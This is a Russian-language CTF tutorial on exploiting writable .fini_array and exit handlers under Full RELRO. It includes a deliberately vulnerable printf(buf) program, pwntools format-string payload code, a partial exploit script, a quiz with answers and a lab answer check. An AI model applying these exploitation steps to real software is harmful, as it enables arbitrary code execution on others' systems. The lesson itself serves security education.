---
id: pwn-fini-init-array
title: ".fini_array/.init_array и exit-обработчики"
category: pwn
parent: pwn-got-plt
difficulty: hard
order: 2
tags: [fini-array, init-array, atexit, exit-handlers, control-flow, partial-relro]
prerequisites: [pwn-got-plt, pwn-rop, pwn-mitigations]
useful_for:
  - "CTF Pwn категория"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Массивы указателей .init_array/.fini_array и обработчики atexit дают цель для подмены потока управления, когда GOT защищён (Full RELRO); разбираем перезапись и повторный вызов main."
lab:
  kind: shell
  title: "Практика: INIT_ARRAY / FINI_ARRAY"
  toolset: [core, readelf]
  workdir: /home/student/task
  files: [task.md, ctors]
  check: "grep -q '0x403dd8' answer.txt"
  hints:
    - "Конструкторы/деструкторы регистрируются в массивах указателей."
    - "Динамические теги видны в `readelf -d ctors`."
    - "Найди тег `INIT_ARRAY` — его значение и есть адрес массива."
---

## Вопрос, с которого всё начинается

Ты проверил бинарь и увидел **Full RELRO**. Это значит: GOT стал read-only, и любимый трюк из прошлых уроков — записать `system` в `puts@got` — больше не работает. А записать что-то надо: переполнение даёт лишь один раунд ввода, а нам нужно два.

Куда ещё можно записать указатель на функцию, чтобы он выполнился? Оказывается, в бинаре есть **другие** массивы указателей, которые RELRO не защищает.

## Наш пример: Full RELRO + format string

```c
#include <stdio.h>
int main(void) {
    char buf[64];
    printf("Name: ");
    fgets(buf, 64, stdin);
    printf(buf);          // format string — примитив произвольной записи
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ checksec --file=./chall
    RELRO:    Full RELRO
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

GOT писать нельзя. Ищем, что осталось записываемым.

## Шаг 1. Что такое .fini_array

ELF-бинарь содержит массивы указателей на функции:

- **`.init_array`** — конструкторы, вызываемые **до** `main`.
- **`.fini_array`** — деструкторы, вызываемые **после** `main` при нормальном завершении.

Когда `main` делает `return`, среда исполнения проходит по цепочке финализаторов и вызывает `.fini_array[0]`. И вот ключевой факт: **`GNU_RELRO` покрывает GOT, но обычно не покрывает `.fini_array`**. Значит, при Full RELRO эти массивы часто остаются записываемыми.

Найдём секцию и проверим:

```bash
$ readelf -S ./chall | grep -E "fini_array|init_array"
  [20] .init_array  INIT_ARRAY  0000000000403e10  ...
  [21] .fini_array  FINI_ARRAY  0000000000403e18  ...
$ readelf -l ./chall | grep GNU_RELRO
  GNU_RELRO  0x002e28 0x403e28 ...
```

Сравни адрес `.fini_array` (`0x403e18`) с диапазоном RELRO: если он **вне** диапазона — запись проходит.

## Шаг 2. Идея: переписать .fini_array на main

Если записать в `.fini_array[0]` адрес `main`, то после завершения `main` среда **снова** войдёт в `main`. Программа зациклится, давая нам столько раундов ввода, сколько нужно.

```python
from pwn import *
context.binary = elf = ELF('./chall')

fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
main = elf.symbols['main']
log.info('.fini_array @ %#x, main @ %#x', fini_array, main)
```

```text
[*] .fini_array @ 0x403e18, main @ 0x4011a9
```

## Шаг 3. Записываем через format string

Наш примитив — format string. Формат-строку можно превратить в произвольную запись: спецификатор `%n` пишет число выведенных байт по адресу со стека. pwntools автоматизирует это:

```python
payload = fmtstr_payload(offset, {fini_array: main})
p.sendlineafter(b'Name: ', payload)
```

Здесь `offset` — позиция нашего буфера на стеке (её находят перебором `%N$p`), а словарь задаёт «куда → что записать». Теперь при выходе из `main` управление снова уйдёт в `main`.

Важно: `fmtstr_payload(offset, {elf.got['puts']: ...})` при Full RELRO **упал бы** — GOT read-only. А `.fini_array` — записываема.

## Шаг 4. Используем новые раунды

Получив цикл, мы можем в одном раунде утечь что-нибудь (например, базу libc), а в другом — записать `.fini_array[0]` уже адресом `win`/`system`:

```text
1) Раунд 1: утечка libc через %p/%s.
2) Раунд 2: запись .fini_array[0] = win.
3) Выход из main -> вызывается win -> shell.
```

Если `win` требует аргумент, а `rdi` в момент вызова неконтролируем, сначала ставят `main` для дополнительных раундов, а в одном из них строят полноценный ROP через переполнение стека. Так format string и `.fini_array` дополняют друг друга.

## Шаг 5. Связка с exit-обработчиками

При вызове `exit` (или `return` из `main`) финализаторы исполняются в порядке:

```text
__exit_funcs (atexit/on_exit) -> _IO_cleanup (FSOP) -> .fini_array
```

Это **три независимые записываемые цели**. Если одна закрыта фильтрами, берут другую. На glibc ≥ 2.34, где удалили `__malloc_hook`/`__free_hook`, `.fini_array` и `__exit_funcs` становятся основными целями. Про `atexit` — в `pwn-exit-handlers`.

## Комбинирование с другими записываемыми целями

Full RELRO не означает полную неприступность. Помимо `.fini_array` есть `__exit_funcs`, `tls_dtor_list`, `_IO_list_all` и структуры `_IO_FILE`. Если `.fini_array` по каким-то причинам недоступна (например, линкер включил её в RELRO-сегмент), проверь остальные. Порядок предпочтения для userland: сначала `.fini_array` (простой указатель, легко найти), затем `__exit_funcs` (нужен контроль над heap-структурой), затем FSOP через `_IO_list_all`. Для задач с ограниченным примитивом записи `.fini_array` почти всегда самый дешёвый вариант: одна запись 8 байт даёт вызов нужной функции.

## Шаг 6. Диагностика: почему не сработало

Если после записи ничего не происходит, проверь по порядку:

1. **Используется ли `_exit`/`abort`?** Они завершают процесс **без** вызова финализаторов. `.fini_array` срабатывает только при `exit`/`return` из `main`.
2. **`.fini_array` действительно writable?** `readelf -l ./chall | grep GNU_RELRO` — если адрес внутри RELRO-диапазона, запись молча не проходит.
3. **Тот ли индекс массива?** Записей может быть несколько, вызывается конкретная.
4. **Не испортил ли payload соседние байты?**
5. **Верна ли база?** Для PIE ошибка на байт ломает всё.

В gdb: `b *__run_exit_handlers`, `x/4gx <fini_array>` до и после записи — видно, изменилось ли значение.

## Как найти адреса

```bash
$ readelf -S ./chall | grep -E "fini_array|init_array"
$ objdump -s -j .fini_array ./chall
$ readelf -l ./chall | grep GNU_RELRO
$ python3 -c "from pwn import *; e=ELF('./chall'); \
  print(hex(e.get_section_by_name('.fini_array').header.sh_addr))"
```

Для PIE-бинаря адрес секции — это смещение от базы; в рантайме прибавь утёкшую базу.

## Обход фильтров

Если фильтруется нулевой байт или ограничена длина: пиши только младшие байты через `%hhn` (если старшие совпадают); при строковом переполнении нулевой байт обрывает ввод — используй heap-примитив или format string; если `%n` запрещён, но есть heap-примитив, применяй его.

## Почему это по-прежнему актуально

Несмотря на новые митигации, `.fini_array` остаётся востребованной целью в задачах уровня CTF hard/expert и в реальных бинарях с Full RELRO. Линкеры glibc по умолчанию не помещают `.init_array`/`.fini_array` в RELRO-сегмент, поэтому одна удачная произвольная запись даёт вызов контролируемой функции. Связка «цикл по `main` + финализаторы» десятилетиями используется в эксплойтах, и понимание порядка вызовов `__run_exit_handlers` отличает уверенного pwn-специалиста от новичка. Практикуйся на задачах, где GOT закрыт, — это заставляет искать нестандартные цели и глубже понимать загрузчик ELF.

## На что смотреть дальше

- **RELRO защищает не всё.** Только GOT и часть секций; `.fini_array`/`.init_array` часто writable — проверяй `GNU_RELRO`.
- **Не тот триггер.** `_exit`, `abort`, `__builtin_trap` не вызывают финализаторы.
- **Бесконечный цикл без выхода.** Перезапись на `main` даёт цикл; нужен раунд, где мы реально получаем shell.
- **PIE** — адреса рандомизированы, нужна база.
- **Порядок вызовов** при нескольких записях массива имеет значение.

## Что мы теперь знаем

- `.fini_array` вызывается после `main`; `.init_array` — до.
- При Full RELRO GOT read-only, но `.fini_array` обычно записываема.
- Запись `main` в `.fini_array` даёт повторные раунды ввода.
- Примитивом может быть format string (`fmtstr_payload`) или heap.
- `.fini_array` — самый дешёвый обход Full RELRO: одна запись 8 байт.

## Полный PoC: цикл → утечка → shell

Соберём эксплойт целиком, как он выглядит в solve-скрипте. Бинарь — Full RELRO, No PIE, format string в `printf(buf)`.

```python
from pwn import *
context.binary = elf = ELF('./chall')

def start():
    return process('./chall')

io = start()
fini = elf.get_section_by_name('.fini_array').header.sh_addr
main = elf.symbols['main']

# 1) найти смещение нашего буфера на стеке
io.sendlineafter(b'Name: ', b'%6$p')      # подбираем N в %N$p
io.recvuntil(b'0x')
leak = int(io.recvline().strip(), 16)

# 2) записать main в .fini_array[0] -> цикл по main
io.sendlineafter(b'Name: ', fmtstr_payload(6, {fini: main}))

# 3) теперь у нас сколько угодно раундов: утекаем libc
io.sendlineafter(b'Name: ', b'%7$p')      # адрес из libc
...
# 4) в следующем раунде пишем .fini_array[0] = one_gadget/win
```

Ключевые грабли: `fmtstr_payload` пишет **по 8 байт**, поэтому цель должна быть выровнена; если `.fini_array` попадает в RELRO-сегмент — запись молча не пройдёт (проверяйте `readelf -l`). И помните: после перезаписи `.fini_array` на `main` программа **не завершится** — это и есть источник новых раундов.

## Записываемые цели при Full RELRO

| Цель | Когда срабатывает | Цена/условие |
|---|---|---|
| `.fini_array` | `exit`/`return` из `main` | 1 запись 8 байт, часто writable |
| `__exit_funcs` (atexit) | `exit`/`return` | нужен контроль heap-структуры |
| `tls_dtor_list` | `exit`, thread-local | указатель + heap-фейк |
| `_IO_list_all` (FSOP) | `exit` → `_IO_cleanup` | vtable-фейк, сложно |
| `__malloc_hook` | `malloc` | **удалён в glibc ≥ 2.34** |
| `__free_hook` | `free` | **удалён в glibc ≥ 2.34** |

Порядок предпочтения прост: сначала `.fini_array` (одна запись), затем `__exit_funcs`, затем FSOP. Если на бинаре стоит фильтр `%n` — переходите на heap-примитив (tcache poisoning) и пишите те же цели.

## .init_array и .fini_array: когда какой использовать

`.init_array` вызывает функции **до** `main`, поэтому перезапись её элемента даёт выполнение ещё до основного кода — удобно, если программа быстро завершается или проверяет что-то в `main`. Но есть нюанс: `.init_array` исполняется один раз при старте, до того как у нас появился примитив записи. Поэтому на практике в CTF чаще берут именно `.fini_array` (после `main`, когда утечка/запись уже сделаны) либо комбинируют: `.init_array` в редких задачах с примитивом «до main», `.fini_array` — как основной путь повторного входа.

## Квиз

Проверь себя.

```quiz
- question: "Когда вызывается .fini_array?"
  options:
    - "После main при exit/return"
    - "До main"
    - "При malloc"
    - "При fork"
  answer: 0
  explanation: ".fini_array содержит финализаторы, вызываемые при завершении."
- question: "Почему .fini_array полезна при Full RELRO?"
  options:
    - "Она остаётся записываемой, в отличие от GOT"
    - "Она read-only"
    - "Она в куче"
    - "Она не существует"
  answer: 0
  explanation: "RELRO защищает GOT, но .fini_array/.init_array часто writable."
- question: "Что даёт перезапись .fini_array на main?"
  options:
    - "Повторный вызов main (loop) для дополнительных раундов"
    - "Отключение ASLR"
    - "Снятие canary"
    - "Расширение tcache"
  answer: 0
  explanation: "main вызывается снова при завершении — получаем новые раунды ввода."
- question: "Какое завершение НЕ вызовет финализаторы?"
  options:
    - "_exit / abort"
    - "return из main"
    - "exit()"
    - "нормальный конец программы"
  answer: 0
  explanation: "_exit и abort завершают процесс без вызова .fini_array."
- question: "Как найти адрес .fini_array?"
  options:
    - "readelf -S и objdump -s -j .fini_array"
    - "nm"
    - "ldd"
    - "strings"
  answer: 0
  explanation: "Секции находятся через readelf/objdump."
```

## Куда дальше

В `pwn-fs-advanced` мы продолжим тему записываемых целей: разберём `.fini_array` вместе с переполнением и вызовом функций по цепочке в более сложных сценариях. А пока главное: **когда GOT закрыт Full RELRO, `.fini_array` — записываемый указатель на функцию, и одна запись даёт либо цикл по `main`, либо сразу вызов `win`.**

## Где пригодится

- **CTF:** Pwn — Full RELRO задачи.
- **Bug bounty:** анализ нативных сервисов.
- **Пентест:** разработка эксплойтов.
- **Работа:** vulnerability research.
